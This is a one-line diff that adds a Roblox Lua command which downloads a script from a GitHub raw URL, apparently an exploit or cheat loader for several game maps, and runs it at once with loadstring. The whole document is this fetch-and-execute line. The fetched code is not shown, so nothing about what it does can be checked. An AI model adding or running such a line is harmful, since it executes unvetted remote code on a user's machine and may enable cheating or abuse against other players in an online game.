@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Frontierpifurnace41/loaders/main/loaders/all-maps-skate-tree-spam7-y5692c72o5qvqd.lua"))()
